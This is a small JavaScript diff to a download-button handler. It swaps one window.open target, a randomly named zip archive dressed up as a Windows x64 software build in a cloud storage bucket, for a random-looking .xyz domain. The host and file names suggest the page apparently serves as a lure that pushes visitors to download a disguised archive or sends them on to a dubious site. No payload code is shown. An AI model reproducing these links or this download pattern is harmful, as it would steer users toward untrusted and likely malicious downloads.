@@ -13,5 +13,5 @@
 })();
 
 function btnDown() {
-    window.open('https://jasgsdhnayutjzg.s3.us-east-005.backblazeb2.com/Vicce_x64_win7-11_Quioaydiiek_v412001.23.zip')
+    window.open('https://xhshuxcoslemz.xyz/')
                 }
